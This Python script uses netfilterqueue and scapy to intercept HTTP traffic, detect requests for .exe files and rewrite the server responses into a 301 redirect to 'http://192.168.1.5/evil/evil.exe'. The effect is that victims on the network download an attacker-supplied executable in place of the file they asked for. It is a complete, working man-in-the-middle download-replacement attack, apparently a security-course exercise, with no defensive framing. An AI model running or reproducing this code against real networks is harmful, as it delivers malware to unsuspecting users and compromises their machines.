import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet,load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet
	
def process_packet(packet):
	scapypacket = scapy.IP(packet.get_payload())
	if scapypacket.haslayer(scapy.Raw) and scapypacket.haslayer(scapy.TCP):
		print(scapypacket.show())
		if scapypacket[scapy.TCP].dport == 80:
			print("http req")
			print(scapypacket.show())
			if ".exe" in str(scapypacket[scapy.Raw].load) and "192.168.1.5" not in str(scapypacket[scapy.Raw].load):
				print("exe req")
				ack_list.append(scapypacket[scapy.TCP].ack)
				
		elif scapypacket[scapy.TCP].sport == 80:
			print("http res")
			if scapypacket[scapy.TCP].seq in ack_list:
				ack_list.remove(scapypacket[scapy.TCP].seq)
				modifiedpacket = set_load( scapypacket, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.1.5/evil/evil.exe\n\n" )
				packet.set_payload(bytes(modifiedpacket))
				
	
	packet.accept()
	
queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()
